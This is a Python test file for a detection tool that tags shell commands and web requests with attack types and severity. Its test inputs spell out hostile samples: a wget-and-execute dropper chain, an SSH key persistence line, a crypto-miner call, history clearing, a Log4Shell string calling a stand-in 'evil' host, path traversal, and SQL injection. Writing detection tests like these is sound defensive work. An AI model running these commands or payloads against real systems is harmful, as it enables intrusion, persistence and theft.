from sentinel.enrich import classify_shell, classify_web


def test_dropper_chain_is_tagged():
    r = classify_shell("cd /tmp; wget http://10.9.8.7/x.sh; chmod +x x.sh; ./x.sh")
    assert {"tool_download", "make_executable"} <= set(r["tags"])
    assert "T1105" in r["attack"] and r["sev"] >= 3
    assert r["iocs"]["urls"] == ["http://10.9.8.7/x.sh"]
    assert "10.9.8.7" in r["iocs"]["ips"]


def test_ssh_key_persistence_is_top_severity():
    r = classify_shell('echo "ssh-rsa AAA" >> ~/.ssh/authorized_keys')
    assert "ssh_key_persistence" in r["tags"] and r["sev"] == 4


def test_miner_and_cleanup():
    assert "cryptominer" in classify_shell("./xmrig --url stratum+tcp://pool:3333")["tags"]
    assert "cover_tracks" in classify_shell("history -c && unset HISTFILE")["tags"]


def test_benign_recon_is_low_severity():
    r = classify_shell("uname -a")
    assert r["tags"] == ["system_discovery"] and r["sev"] == 2


def test_web_attacks():
    assert "log4shell" in classify_web("/", {"x-api": "${jndi:ldap://evil/a}"}, "")["tags"]
    assert "path_traversal" in classify_web("/..%2f..%2fetc/passwd", {}, "")["tags"]
    assert "sqli" in classify_web("/?id=1' OR 1=1--", {}, "")["tags"]
    assert "info_leak_probe" in classify_web("/.env", {}, "")["tags"]
    clean = classify_web("/", {"user-agent": "Mozilla/5.0"}, "")
    assert clean["tags"] == [] and clean["sev"] == 1
